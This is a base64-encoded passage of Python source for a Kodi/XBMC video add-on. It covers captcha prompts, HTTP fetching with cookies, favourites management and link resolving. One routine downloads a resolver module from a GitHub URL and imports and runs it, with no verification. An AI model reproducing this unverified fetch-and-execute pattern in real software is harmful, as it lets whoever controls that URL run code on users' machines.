ICBjYXB0Y2hhX2ltYWdlX3VybD0naHR0cDovL3d3dy5nb29nbGUuY29tL3JlY2FwdGNoYS9hcGkvJytjYXB0Y2hhX2ltYWdlX3VybA0KICAgICAgICBpbXBvcnQgcmFuZG9tDQogICAgICAgIG49cmFuZG9tLnJhbmRyYW5nZSgxMDAsMTAwMCw1KQ0KICAgICAgICBsb2NhbF9jYXB0Y2hhID0gb3MucGF0aC5qb2luKHByb2ZpbGUsc3RyKG4pICsiY2FwdGNoYS5pbWciICkNCiAgICAgICAgbG9jYWxGaWxlID0gb3Blbihsb2NhbF9jYXB0Y2hhLCAid2IiKQ0KICAgICAgICBsb2NhbEZpbGUud3JpdGUoZ2V0VXJsKGNhcHRjaGFfaW1hZ2VfdXJsLGNvb2tpZUphcj1jaikpDQogICAgICAgIGxvY2FsRmlsZS5jbG9zZSgpDQogICAgICAgIHNvbHZlciA9IElucHV0V2luZG93KGNhcHRjaGE9bG9jYWxfY2FwdGNoYSkNCiAgICAgICAgc29sdXRpb24gPSBzb2x2ZXIuZ2V0KCkNCiAgICAgICAgb3MucmVtb3ZlKGxvY2FsX2NhcHRjaGEpDQoNCiAgICBpZiBjYXB0Y2hhX3JlbG9hZF9yZXNwb25zZV9jaGFsbDoNCiAgICAgICAgaWYgdHlwZT09MToNCiAgICAgICAgICAgIHJldHVybiAncmVjYXB0Y2hhX2NoYWxsZW5nZV9maWVsZD0nK3VybGxpYi5xdW90ZV9wbHVzKGNhcHRjaGFfcmVsb2FkX3Jlc3BvbnNlX2NoYWxsKSsnJnJlY2FwdGNoYV9yZXNwb25zZV9maWVsZD0nK3VybGxpYi5xdW90ZV9wbHVzKHNvbHV0aW9uKQ0KICAgICAgICBlbGlmIHR5cGU9PTI6DQogICAgICAgICAgICByZXR1cm4gJ3JlY2FwdGNoYV9jaGFsbGVuZ2VfZmllbGQ6JytjYXB0Y2hhX3JlbG9hZF9yZXNwb25zZV9jaGFsbCsnLHJlY2FwdGNoYV9yZXNwb25zZV9maWVsZDonK3NvbHV0aW9uDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICByZXR1cm4gJ3JlY2FwdGNoYV9jaGFsbGVuZ2VfZmllbGQ9Jyt1cmxsaWIucXVvdGVfcGx1cyhjYXB0Y2hhX3JlbG9hZF9yZXNwb25zZV9jaGFsbCkrJyZyZWNhcHRjaGFfcmVzcG9uc2VfZmllbGQ9Jyt1cmxsaWIucXVvdGVfcGx1cyhzb2x1dGlvbikNCiAgICBlbHNlOg0KICAgICAgICByZXR1cm4gJycNCiAgICAgICAgDQoNCmRlZiBnZXRVcmwodXJsLCBjb29raWVKYXI9Tm9uZSxwb3N0PU5vbmUsIHRpbWVvdXQ9MjAsIGhlYWRlcnM9Tm9uZSwgbm9yZWRpcj1GYWxzZSk6DQoNCg0KICAgIGNvb2tpZV9oYW5kbGVyID0gdXJsbGliMi5IVFRQQ29va2llUHJvY2Vzc29yKGNvb2tpZUphcikNCg0KICAgIGlmIG5vcmVkaXI6DQogICAgICAgIG9wZW5lciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKE5vUmVkaXJlY3Rpb24sY29va2llX2hhbmRsZXIsIHVybGxpYjIuSFRUUEJhc2ljQXV0aEhhbmRsZXIoKSwgdXJsbGliMi5IVFRQSGFuZGxlcigpKQ0KICAgIGVsc2U6DQogICAgICAgIG9wZW5lciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKGNvb2tpZV9oYW5kbGVyLCB1cmxsaWIyLkhUVFBCYXNpY0F1dGhIYW5kbGVyKCksIHVybGxpYjIuSFRUUEhhbmRsZXIoKSkNCiAgICAjb3BlbmVyID0gdXJsbGliMi5pbnN0YWxsX29wZW5lcihvcGVuZXIpDQogICAgcmVxID0gdXJsbGliMi5SZXF1ZXN0KHVybCkNCiAgICByZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8zMy4wLjE3NTAuMTU0IFNhZmFyaS81MzcuMzYnKQ0KICAgIGlmIGhlYWRlcnM6DQogICAgICAgIGZvciBoLGh2IGluIGhlYWRlcnM6DQogICAgICAgICAgICByZXEuYWRkX2hlYWRlcihoLGh2KQ0KDQogICAgcmVzcG9uc2UgPSBvcGVuZXIub3BlbihyZXEscG9zdCx0aW1lb3V0PXRpbWVvdXQpDQogICAgbGluaz1yZXNwb25zZS5yZWFkKCkNCiAgICByZXNwb25zZS5jbG9zZSgpDQogICAgcmV0dXJuIGxpbms7DQoNCg0KZGVmIGdldF9kZWNvZGUoc3RyLHJlZz1Ob25lKToNCiAgICBpZiByZWc6DQogICAgICAgIHN0cj1yZS5maW5kYWxsKHJlZywgc3RyKVswXQ0KICAgIHMxID0gdXJsbGliLnVucXVvdGUoc3RyWzA6IGxlbihzdHIpLTFdKTsNCiAgICB0ID0gJyc7DQogICAgZm9yIGkgaW4gcmFuZ2UoIGxlbihzMSkpOg0KICAgICAgICB0ICs9IGNocihvcmQoczFbaV0pIC0gczFbbGVuKHMxKS0xXSk7DQogICAgdD11cmxsaWIudW5xdW90ZSh0KQ0KIyAgICBwcmludCB0DQogICAgcmV0dXJuIHQNCg0KDQpkZWYgamF2YXNjcmlwdFVuRXNjYXBlKHN0cik6DQogICAganM9cmUuZmluZGFsbCgndW5lc2NhcGVcKFwnKC4qPylcJycsc3RyKQ0KIyAgICBwcmludCAnanMnLGpzDQogICAgaWYgKG5vdCBqcz09Tm9uZSkgYW5kIGxlbihqcyk+MDoNCiAgICAgICAgZm9yIGogaW4ganM6DQogICAgICAgICAgICAjcHJpbnQgdXJsbGliLnVucXVvdGUoaikNCiAgICAgICAgICAgIHN0cj1zdHIucmVwbGFjZShqICx1cmxsaWIudW5xdW90ZShqKSkNCiAgICByZXR1cm4gc3RyDQoNCmlpZD0wDQoNCg0KZGVmIGFza0NhcHRjaGEobSxodG1sX3BhZ2UsIGNvb2tpZUphcik6DQogICAgZ2xvYmFsIGlpZA0KICAgIGlpZCs9MQ0KICAgIGV4cHJlPSBtWydleHByZXMnXQ0KICAgIHBhZ2VfdXJsID0gbVsncGFnZSddDQogICAgY2FwdGNoYV9yZWdleD1yZS5jb21waWxlKCdcJExpdmVTdHJlYW1DYXB0Y2hhXFsoW15cXV0qKVxdJykuZmluZGFsbChleHByZSlbMF0NCg0KICAgIGNhcHRjaGFfdXJsPXJlLmNvbXBpbGUoY2FwdGNoYV9yZWdleCkuZmluZGFsbChodG1sX3BhZ2UpWzBdDQojICAgIHByaW50IGV4cHJlLGNhcHRjaGFfcmVnZXgsY2FwdGNoYV91cmwNCiAgICBpZiBub3QgY2FwdGNoYV91cmwuc3RhcnRzd2l0aCgiaHR0cCIpOg0KICAgICAgICBwYWdlXz0naHR0cDovLycrIiIuam9pbihwYWdlX3VybC5zcGxpdCgnLycpWzI6M10pDQogICAgICAgIGlmIGNhcHRjaGFfdXJsLnN0YXJ0c3dpdGgoIi8iKToNCiAgICAgICAgICAgIGNhcHRjaGFfdXJsPXBhZ2VfK2NhcHRjaGFfdXJsDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBjYXB0Y2hhX3VybD1wYWdlXysnLycrY2FwdGNoYV91cmwNCg0KICAgIGxvY2FsX2NhcHRjaGEgPSBvcy5wYXRoLmpvaW4ocHJvZmlsZSwgc3RyKGlpZCkrImNhcHRjaGEuanBnIiApDQogICAgbG9jYWxGaWxlID0gb3Blbihsb2NhbF9jYXB0Y2hhLCAid2IiKQ0KIyAgICBwcmludCAnIGMgY2FwdXJsJyxjYXB0Y2hhX3VybA0KICAgIHJlcSA9IHVybGxpYjIuUmVxdWVzdChjYXB0Y2hhX3VybCkNCiAgICByZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IHJ2OjE0LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTQuMC4xJykNCiAgICBpZiAncmVmZXJlcicgaW4gbToNCiAgICAgICAgcmVxLmFkZF9oZWFkZXIoJ1JlZmVyZXInLCBtWydyZWZlcmVyJ10pDQogICAgaWYgJ2FnZW50JyBpbiBtOg0KICAgICAgICByZXEuYWRkX2hlYWRlcignVXNlci1hZ2VudCcsIG1bJ2FnZW50J10pDQogICAgaWYgJ3NldGNvb2tpZScgaW4gbToNCiMgICAgICAgIHByaW50ICdhZGRpbmcgY29va2llJyxtWydzZXRjb29raWUnXQ0KICAgICAgICByZXEuYWRkX2hlYWRlcignQ29va2llJywgbVsnc2V0Y29va2llJ10pDQoNCiAgICAjY29va2llX2hhbmRsZXIgPSB1cmxsaWIyLkhUVFBDb29raWVQcm9jZXNzb3IoY29va2llSmFyKQ0KICAgICNvcGVuZXIgPSB1cmxsaWIyLmJ1aWxkX29wZW5lcihjb29raWVfaGFuZGxlciwgdXJsbGliMi5IVFRQQmFzaWNBdXRoSGFuZGxlcigpLCB1cmxsaWIyLkhUVFBIYW5kbGVyKCkpDQogICAgI29wZW5lciA9IHVybGxpYjIuaW5zdGFsbF9vcGVuZXIob3BlbmVyKQ0KICAgIHVybGxpYjIudXJsb3BlbihyZXEpDQogICAgcmVzcG9uc2UgPSB1cmxsaWIyLnVybG9wZW4ocmVxKQ0KDQogICAgbG9jYWxGaWxlLndyaXRlKHJlc3BvbnNlLnJlYWQoKSkNCiAgICByZXNwb25zZS5jbG9zZSgpDQogICAgbG9jYWxGaWxlLmNsb3NlKCkNCiAgICBzb2x2ZXIgPSBJbnB1dFdpbmRvdyhjYXB0Y2hhPWxvY2FsX2NhcHRjaGEpDQogICAgc29sdXRpb24gPSBzb2x2ZXIuZ2V0KCkNCiAgICByZXR1cm4gc29sdXRpb24NCg0KDQpkZWYgYXNrQ2FwdGNoYU5ldyhpbWFnZXJlZ2V4LGh0bWxfcGFnZSxjb29raWVKYXIsbSk6DQogICAgZ2xvYmFsIGlpZA0KICAgIGlpZCs9MQ0KDQoNCiAgICBpZiBub3QgaW1hZ2VyZWdleD09Jyc6DQogICAgICAgIGlmIGh0bWxfcGFnZS5zdGFydHN3aXRoKCJodHRwIik6DQogICAgICAgICAgICBwYWdlXz1nZXRVcmwoaHRtbF9wYWdlLGNvb2tpZUphcj1jb29raWVKYXIpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBwYWdlXz1odG1sX3BhZ2UNCiAgICAgICAgY2FwdGNoYV91cmw9cmUuY29tcGlsZShpbWFnZXJlZ2V4KS5maW5kYWxsKGh0bWxfcGFnZSlbMF0NCiAgICBlbHNlOg0KICAgICAgICBjYXB0Y2hhX3VybD1odG1sX3BhZ2UNCiAgICAgICAgaWYgJ29uZXBsYXkudHYvZW1iZWQnIGluIGh0bWxfcGFnZToNCiAgICAgICAgICAgIGltcG9ydCBvbmVwbGF5DQogICAgICAgICAgICBwYWdlXz1nZXRVcmwoaHRtbF9wYWdlLGNvb2tpZUphcj1jb29raWVKYXIpDQogICAgICAgICAgICBjYXB0Y2hhX3VybD1vbmVwbGF5LmdldENhcHRjaGFVcmwocGFnZV8pDQoNCiAgICBsb2NhbF9jYXB0Y2hhID0gb3MucGF0aC5qb2luKHByb2ZpbGUsIHN0cihpaWQpKyJjYXB0Y2hhLmpwZyIgKQ0KICAgIGxvY2FsRmlsZSA9IG9wZW4obG9jYWxfY2FwdGNoYSwgIndiIikNCiMgICAgcHJpbnQgJyBjIGNhcHVybCcsY2FwdGNoYV91cmwNCiAgICByZXEgPSB1cmxsaWIyLlJlcXVlc3QoY2FwdGNoYV91cmwpDQogICAgcmVxLmFkZF9oZWFkZXIoJ1VzZXItQWdlbnQnLCAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBydjoxNC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzE0LjAuMScpDQogICAgaWYgJ3JlZmVyZXInIGluIG06DQogICAgICAgIHJlcS5hZGRfaGVhZGVyKCdSZWZlcmVyJywgbVsncmVmZXJlciddKQ0KICAgIGlmICdhZ2VudCcgaW4gbToNCiAgICAgICAgcmVxLmFkZF9oZWFkZXIoJ1VzZXItYWdlbnQnLCBtWydhZ2VudCddKQ0KICAgIGlmICdhY2NlcHQnIGluIG06DQogICAgICAgIHJlcS5hZGRfaGVhZGVyKCdBY2NlcHQnLCBtWydhY2NlcHQnXSkNCiAgICBpZiAnc2V0Y29va2llJyBpbiBtOg0KIyAgICAgICAgcHJpbnQgJ2FkZGluZyBjb29raWUnLG1bJ3NldGNvb2tpZSddDQogICAgICAgIHJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCBtWydzZXRjb29raWUnXSkNCg0KICAgICNjb29raWVfaGFuZGxlciA9IHVybGxpYjIuSFRUUENvb2tpZVByb2Nlc3Nvcihjb29raWVKYXIpDQogICAgI29wZW5lciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKGNvb2tpZV9oYW5kbGVyLCB1cmxsaWIyLkhUVFBCYXNpY0F1dGhIYW5kbGVyKCksIHVybGxpYjIuSFRUUEhhbmRsZXIoKSkNCiAgICAjb3BlbmVyID0gdXJsbGliMi5pbnN0YWxsX29wZW5lcihvcGVuZXIpDQogICAgI3VybGxpYjIudXJsb3BlbihyZXEpDQogICAgcmVzcG9uc2UgPSB1cmxsaWIyLnVybG9wZW4ocmVxKQ0KDQogICAgbG9jYWxGaWxlLndyaXRlKHJlc3BvbnNlLnJlYWQoKSkNCiAgICByZXNwb25zZS5jbG9zZSgpDQogICAgbG9jYWxGaWxlLmNsb3NlKCkNCiAgICBzb2x2ZXIgPSBJbnB1dFdpbmRvdyhjYXB0Y2hhPWxvY2FsX2NhcHRjaGEpDQogICAgc29sdXRpb24gPSBzb2x2ZXIuZ2V0KCkNCiAgICByZXR1cm4gc29sdXRpb24NCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIEZ1bmN0aW9uICA6IEdVSUVkaXRFeHBvcnROYW1lICAgICAgICAgICAgICAgICAgICAgICAgICMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBQYXJhbWV0ZXIgOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjDQojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMNCiMgbmFtZSAgICAgICAgc3VnZXN0ZWQgbmFtZSBmb3IgZXhwb3J0ICAgICAgICAgICAgICAgICAgIw0KIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIA0KIyBSZXR1cm5zICAgOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjDQojICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMNCiMgbmFtZSAgICAgICAgbmFtZSBvZiBleHBvcnQgZXhjbHVkaW5nIGFueSBleHRlbnNpb24gICAgIw0KIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KDQpkZWYgVGFrZUlucHV0KG5hbWUsIGhlYWRuYW1lKToNCg0KDQogICAga2IgPSB4Ym1jLktleWJvYXJkKCdkZWZhdWx0JywgJ2hlYWRpbmcnLCBUcnVlKQ0KICAgIGtiLnNldERlZmF1bHQobmFtZSkNCiAgICBrYi5zZXRIZWFkaW5nKGhlYWRuYW1lKQ0KICAgIGtiLnNldEhpZGRlbklucHV0KEZhbHNlKQ0KICAgIHJldHVybiBrYi5nZXRUZXh0KCkNCg0KICAgDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KY2xhc3MgSW5wdXRXaW5kb3coeGJtY2d1aS5XaW5kb3dEaWFsb2cpOg0KICAgIGRlZiBfX2luaXRfXyhzZWxmLCAqYXJncywgKiprd2FyZ3MpOg0KICAgICAgICBzZWxmLmNwdGxvYyA9IGt3YXJncy5nZXQoJ2NhcHRjaGEnKQ0KICAgICAgICBzZWxmLmltZyA9IHhibWNndWkuQ29udHJvbEltYWdlKDMzNSwzMCw2MjQsNjAsc2VsZi5jcHRsb2MpDQogICAgICAgIHNlbGYuYWRkQ29udHJvbChzZWxmLmltZykNCiAgICAgICAgc2VsZi5rYmQgPSB4Ym1jLktleWJvYXJkKCkNCg0KICAgIGRlZiBnZXQoc2VsZik6DQogICAgICAgIHNlbGYuc2hvdygpDQogICAgICAgIHRpbWUuc2xlZXAoMikNCiAgICAgICAgc2VsZi5rYmQuZG9Nb2RhbCgpDQogICAgICAgIGlmIChzZWxmLmtiZC5pc0NvbmZpcm1lZCgpKToNCiAgICAgICAgICAgIHRleHQgPSBzZWxmLmtiZC5nZXRUZXh0KCkNCiAgICAgICAgICAgIHNlbGYuY2xvc2UoKQ0KICAgICAgICAgICAgcmV0dXJuIHRleHQNCiAgICAgICAgc2VsZi5jbG9zZSgpDQogICAgICAgIHJldHVybiBGYWxzZQ0KDQoNCmRlZiBnZXRFcG9jVGltZSgpOg0KICAgIGltcG9ydCB0aW1lDQogICAgcmV0dXJuIHN0cihpbnQodGltZS50aW1lKCkqMTAwMCkpDQoNCg0KZGVmIGdldEVwb2NUaW1lMigpOg0KICAgIGltcG9ydCB0aW1lDQogICAgcmV0dXJuIHN0cihpbnQodGltZS50aW1lKCkpKQ0KDQoNCmRlZiBnZXRfcGFyYW1zKCk6DQogICAgICAgIHBhcmFtPVtdDQogICAgICAgIHBhcmFtc3RyaW5nPXN5cy5hcmd2WzJdDQogICAgICAgIGlmIGxlbihwYXJhbXN0cmluZyk+PTI6DQogICAgICAgICAgICBwYXJhbXM9c3lzLmFyZ3ZbMl0NCiAgICAgICAgICAgIGNsZWFuZWRwYXJhbXM9cGFyYW1zLnJlcGxhY2UoJz8nLCcnKQ0KICAgICAgICAgICAgaWYgKHBhcmFtc1tsZW4ocGFyYW1zKS0xXT09Jy8nKToNCiAgICAgICAgICAgICAgICBwYXJhbXM9cGFyYW1zWzA6bGVuKHBhcmFtcyktMl0NCiAgICAgICAgICAgIHBhaXJzb2ZwYXJhbXM9Y2xlYW5lZHBhcmFtcy5zcGxpdCgnJicpDQogICAgICAgICAgICBwYXJhbT17fQ0KICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKHBhaXJzb2ZwYXJhbXMpKToNCiAgICAgICAgICAgICAgICBzcGxpdHBhcmFtcz17fQ0KICAgICAgICAgICAgICAgIHNwbGl0cGFyYW1zPXBhaXJzb2ZwYXJhbXNbaV0uc3BsaXQoJz0nKQ0KICAgICAgICAgICAgICAgIGlmIChsZW4oc3BsaXRwYXJhbXMpKT09MjoNCiAgICAgICAgICAgICAgICAgICAgcGFyYW1bc3BsaXRwYXJhbXNbMF1dPXNwbGl0cGFyYW1zWzFdDQogICAgICAgIHJldHVybiBwYXJhbQ0KDQoNCmRlZiBnZXRGYXZvcml0ZXMoKToNCiAgICAgICAgaXRlbXMgPSBqc29uLmxvYWRzKG9wZW4oZmF2b3JpdGVzKS5yZWFkKCkpDQogICAgICAgIHRvdGFsID0gbGVuKGl0ZW1zKQ0KICAgICAgICBmb3IgaSBpbiBpdGVtczoNCiAgICAgICAgICAgIG5hbWUgPSBpWzBdDQogICAgICAgICAgICB1cmwgPSBpWzFdDQogICAgICAgICAgICBpY29uaW1hZ2UgPSBpWzJdDQogICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgZmFuQXJ0ID0gaVszXQ0KICAgICAgICAgICAgICAgIGlmIGZhbkFydCA9PSBOb25lOg0KICAgICAgICAgICAgICAgICAgICByYWlzZQ0KICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgIGlmIGFkZG9uLmdldFNldHRpbmcoJ3VzZV90aHVtYicpID09ICJ0cnVlIjoNCiAgICAgICAgICAgICAgICAgICAgZmFuQXJ0ID0gaWNvbmltYWdlDQogICAgICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICAgICAgZmFuQXJ0ID0gZmFuYXJ0DQogICAgICAgICAgICB0cnk6IHBsYXlsaXN0ID0gaVs1XQ0KICAgICAgICAgICAgZXhjZXB0OiBwbGF5bGlzdCA9IE5vbmUNCiAgICAgICAgICAgIHRyeTogcmVnZXhzID0gaVs2XQ0KICAgICAgICAgICAgZXhjZXB0OiByZWdleHMgPSBOb25lDQoNCiAgICAgICAgICAgIGlmIGlbNF0gPT0gMDoNCiAgICAgICAgICAgICAgICBhZGRMaW5rKHVybCxuYW1lLGljb25pbWFnZSxmYW5BcnQsJycsJycsJycsJ2ZhdicscGxheWxpc3QscmVnZXhzLHRvdGFsKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBhZGREaXIobmFtZSx1cmwsaVs0XSxpY29uaW1hZ2UsZmFuYXJ0LCcnLCcnLCcnLCcnLCdmYXYnKQ0KDQpkZWYgYWRkRmF2b3JpdGUobmFtZSx1cmwsaWNvbmltYWdlLGZhbmFydCxtb2RlLHBsYXlsaXN0PU5vbmUscmVnZXhzPU5vbmUpOg0KICAgICAgICBmYXZMaXN0ID0gW10NCiAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGZhdm9yaXRlcyArICd0eHQnKToNCiAgICAgICAgICAgIG9zLm1ha2VkaXJzKGZhdm9yaXRlcyArICd0eHQnKQ0KICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoaGlzdG9yeSk6DQogICAgICAgICAgICBvcy5tYWtlZGlycyhoaXN0b3J5KQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICAjIHNlZW1zIHRoYXQgYWZ0ZXINCiAgICAgICAgICAgIG5hbWUgPSBuYW1lLmVuY29kZSgndXRmLTgnLCAnaWdub3JlJykNCiAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgcGFzcw0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmYXZvcml0ZXMpPT1GYWxzZToNCiAgICAgICAgICAgIGFkZG9uX2xvZygnTWFraW5nIEZhdm9yaXRlcyBGaWxlJykNCiAgICAgICAgICAgIGZhdkxpc3QuYXBwZW5kKChuYW1lLHVybCxpY29uaW1hZ2UsZmFuYXJ0LG1vZGUscGxheWxpc3QscmVnZXhzKSkNCiAgICAgICAgICAgIGEgPSBvcGVuKGZhdm9yaXRlcywgInciKQ0KICAgICAgICAgICAgYS53cml0ZShqc29uLmR1bXBzKGZhdkxpc3QpKQ0KICAgICAgICAgICAgYS5jbG9zZSgpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBhZGRvbl9sb2coJ0FwcGVuZGluZyBGYXZvcml0ZXMnKQ0KICAgICAgICAgICAgYSA9IG9wZW4oZmF2b3JpdGVzKS5yZWFkKCkNCiAgICAgICAgICAgIGRhdGEgPSBqc29uLmxvYWRzKGEpDQogICAgICAgICAgICBkYXRhLmFwcGVuZCgobmFtZSx1cmwsaWNvbmltYWdlLGZhbmFydCxtb2RlKSkNCiAgICAgICAgICAgIGIgPSBvcGVuKGZhdm9yaXRlcywgInciKQ0KICAgICAgICAgICAgYi53cml0ZShqc29uLmR1bXBzKGRhdGEpKQ0KICAgICAgICAgICAgYi5jbG9zZSgpDQoNCmRlZiBybUZhdm9yaXRlKG5hbWUpOg0KICAgICAgICBkYXRhID0ganNvbi5sb2FkcyhvcGVuKGZhdm9yaXRlcykucmVhZCgpKQ0KICAgICAgICBmb3IgaW5kZXggaW4gcmFuZ2UobGVuKGRhdGEpKToNCiAgICAgICAgICAgIGlmIGRhdGFbaW5kZXhdWzBdPT1uYW1lOg0KICAgICAgICAgICAgICAgIGRlbCBkYXRhW2luZGV4XQ0KICAgICAgICAgICAgICAgIGIgPSBvcGVuKGZhdm9yaXRlcywgInciKQ0KICAgICAgICAgICAgICAgIGIud3JpdGUoanNvbi5kdW1wcyhkYXRhKSkNCiAgICAgICAgICAgICAgICBiLmNsb3NlKCkNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICB4Ym1jLmV4ZWN1dGVidWlsdGluKCJYQk1DLkNvbnRhaW5lci5SZWZyZXNoIikNCg0KZGVmIHVybHNvbHZlcih1cmwpOg0KICAgIGlmIGFkZG9uLmdldFNldHRpbmcoJ1VwZGF0ZWNvbW1vbnJlc29sdmVycycpID09ICd0cnVlJzoNCiAgICAgICAgbCA9IG9zLnBhdGguam9pbihob21lLCdnZW5lcmF0b3IucHknKQ0KICAgICAgICBpZiB4Ym1jdmZzLmV4aXN0cyhsKToNCiAgICAgICAgICAgIG9zLnJlbW92ZShsKQ0KDQogICAgICAgIGdlbmVzaXNfdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9sYW1iZGE4MS9sYW1iZGEtYWRkb25zL21hc3Rlci9wbHVnaW4udmlkZW8uZ2VuZXNpcy9jb21tb25yZXNvbHZlcnMucHknDQogICAgICAgIHRoPSB1cmxsaWIudXJscmV0cmlldmUoZ2VuZXNpc191cmwsbCkNCiAgICAgICAgYWRkb24uc2V0U2V0dGluZygnVXBkYXRlY29tbW9ucmVzb2x2ZXJzJywgJ2ZhbHNlJykNCiAgICB0cnk6DQogICAgICAgIGltcG9ydCBnZW5lcmF0b3INCiAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICB4Ym1jLmV4ZWN1dGVidWlsdGluKCJYQk1DLk5vdGlmaWNhdGlvbihQbGVhc2UgZW5hYmxlIFVwZGF0ZSBDb21tb25yZXNvbHZlcnMgdG8gUGxheSBpbiBTZXR0aW5ncy4gLSAsMTAwMDApIikNCg0KICAgIHJlc29sdmVkPWdlbmVyYXRvci5nZXQodXJsKS5yZXN1bHQNCiAgICBpZiB1cmwgPT0gcmVzb2x2ZWQgb3IgcmVzb2x2ZWQgaXMgTm9uZToNCiAgICAgICAgI2ltcG9ydA0KICAgICAgICB4Ym1jLmV4ZWN1dGVidWlsdGluKCJYQk1DLk5vdGlmaWNhdGlvbigiK0FkZG9uVGl0bGUrIixJbmljaWFyIGxpbmshLDUwMDAsIitpY29uKyIpIikNCiAgICAgICAgaW1wb3J0IHVybHJlc29sdmVyDQogICAgICAgIGhvc3QgPSB1cmxyZXNvbHZlci5Ib3N0ZWRNZWRpYUZpbGUodXJsKQ0KICAgICAgICBpZiBob3N0Og0KICAgICAgICAgICAgcmVzb2x2ZXIgPSB1cmxyZXNvbHZlci5yZXNvbHZlKHVybCkNCiAgICAgICAgICAgIHJlc29sdmVkID0gcmVzb2x2ZXINCiAgICBpZiByZXNvbHZlZCA6DQogICAgICAgIGlmIGlzaW5zdGFuY2UocmVzb2x2ZWQsbGlzdCk6DQogICAgICAgICAgICBmb3IgayBpbiByZXNvbHZlZDoNCiAgICAgICAgICAgICAgICBxdWFsaXR5ID0gYWRkb24uZ2V0U2V0dGluZygncXVhbGl0eScpDQogICAgICAgICAgICAgICAgaWYga1sncXVhbGl0eSddID09ICdIRCcgIDoNCiAgICAgICAgICAgICAgICAgICAgcmVzb2x2ZXIgPSBrWyd1cmwnXQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYga1sncXVhbGl0eSddID09ICdTRCcgOg0KICAgICAgICAgICAgICAgICAgICByZXNvbHZlciA9IGtbJ3VybCddDQogICAgICAgICAgICAgICAgZWxpZiBrWydxdWFsaXR5J10gPT0gJzEwODBwJyBhbmQgYWRkb24uZ2V0U2V0dGluZygnMTA4MHBxdWFsaXR5JykgPT0gJ3RydWUnIDoNCiAgICAgICAgICAgICAgICAgICAgcmVzb2x2ZXIgPSBrWyd1cmwnXQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcmVzb2x2ZXIgPSByZXNvbHZlZA0KICAgIHJldHVybiByZXNvbHZlcg0KDQoNCmRlZiBwbGF5X3BsYXlsaXN0KG5hbWUsIG11X3BsYXlsaXN0LHF1ZXVlVmlkZW89Tm9uZSk6DQogICAgICAgIHBsYXlsaXN0ID0geGJtYy5QbGF5TGlzdCh4Ym1jLlBMQVlMSVNUX1ZJREVPKQ0KDQogICAgICAgIGlmIGFkZG9uLmdldFNldHRpbmcoJ2Fza19wbGF5bGlzdF9pdGVtcycpID09ICd0cnVlJyBhbmQgbm90IHF1ZXVlVmlkZW8gOg0KICAgICAgICAgICAgaW1wb3J0IHVybHBhcnNlDQogICAgICAgICAgICBuYW1lcyA9IFtdDQogICAgICAgICAgICBmb3IgaSBpbiBtdV9wbGF5bGlzdDoNCiAgICAgICAgICAgICAgICBkX25hbWU9dXJscGFyc2UudXJscGFyc2UoaSkubmV0bG9jDQogICAgICAgICAgICAgICAgaWYgZF9uYW1lID09ICcnOg0KICAgICAgICAgICAgICAgICAgICBuYW1lcy5hcHBlbmQobmFtZSkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBuYW1lcy5hcHBlbmQoZF9uYW1lKQ0KICAgICAgICAgICAgZGlhbG9nID0geGJtY2d1aS5EaWFsb2coKQ0KICAgICAgICAgICAgaW5kZXggPSBkaWFsb2cuc2VsZWN0KCdDaG9vc2UgYSB2aWRlbyBzb3VyY2UnLCBuYW1lcykNCi